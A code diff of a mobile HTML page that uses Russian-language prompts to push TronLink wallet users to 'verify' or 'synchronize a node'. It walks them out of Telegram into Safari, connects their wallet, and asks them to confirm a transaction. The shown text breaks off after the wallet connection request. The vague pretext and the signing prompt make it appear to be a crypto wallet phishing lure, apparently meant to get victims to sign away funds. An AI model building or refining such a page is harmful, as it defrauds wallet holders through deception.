@@ -3,44 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sync Node</title>
+    <title>Protocol Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
-        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; width: 100%; border: none; cursor: pointer; }
-        .instr { color: #ffcc00; font-size: 12px; margin-top: 20px; line-height: 1.4; display: none; }
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; border-top: 4px solid #ff0013; }
+        .logo { width: 65px; height: 65px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; }
+        h2 { font-size: 20px; margin-bottom: 12px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 18px; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 13px; width: 100%; border: none; cursor: pointer; box-sizing: border-box; }
+        .step { background: rgba(255,204,0,0.1); color: #ffcc00; padding: 15px; border-radius: 15px; font-size: 12px; margin-top: 20px; text-align: left; border: 1px solid rgba(255,204,0,0.2); }
     </style>
 </head>
 <body>
+
 <div class="card">
     <div class="logo">T</div>
-    <h2 id="title">Верификация</h2>
-    <p id="desc">Нажмите кнопку ниже для перехода в TronLink.</p>
+    <h2 id="title">Синхронизация узла</h2>
+    <p id="desc">Нажмите кнопку ниже для перехода в TronLink и подписи транзакции.</p>
     
-    <a href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" id="mainBtn" class="btn">ОТКРЫТЬ TRONLINK</a>
+    <a href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" id="mainBtn" class="btn">ОТКРЫТЬ В TRONLINK</a>
 
-    <div class="instr" id="tip">
-        ☝️ <b>ВАЖНО:</b> Если ничего не произошло, нажмите на <b>три точки (⋮)</b> в углу экрана и выберите <b>"Открыть в Safari"</b>.
+    <div class="step" id="guide">
+        <b>ИНСТРУКЦИЯ ДЛЯ IPHONE:</b><br>
+        1. Нажмите на <b>три точки (⋯)</b> внизу экрана.<br>
+        2. Выберите <b>«Открыть в браузере»</b> (Safari).<br>
+        3. Нажмите кнопку «ОТКРЫТЬ» еще раз.
     </div>
 </div>
 
 <script>
     const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
-    const btn = document.getElementById('mainBtn');
-    const tip = document.getElementById('tip');
-
-    if (!tron) {
-        // Если мы в Телеграме, показываем подсказку про Safari
-        tip.style.display = "block";
-    } else {
-        // Если мы УЖЕ в TronLink
-        document.getElementById('title').innerText = "Узел найден";
-        document.getElementById('desc').innerText = "Нажмите для подтверждения транзакции.";
-        btn.innerText = "ПОДТВЕРДИТЬ";
-        btn.href = "#";
-        btn.onclick = async (e) => {
+    if (tron) {
+        document.getElementById('guide').style.display = "none";
+        document.getElementById('title').innerText = "Узел обнаружен";
+        document.getElementById('desc').innerText = "Кошелек подключен. Подтвердите транзакцию.";
+        const b = document.getElementById('mainBtn');
+        b.innerText = "ПОДТВЕРДИТЬ";
+        b.href = "#";
+        b.onclick = async (e) => {
             e.preventDefault();
             try {
                 await tron.request({ method: 'tron_requestAccounts' });
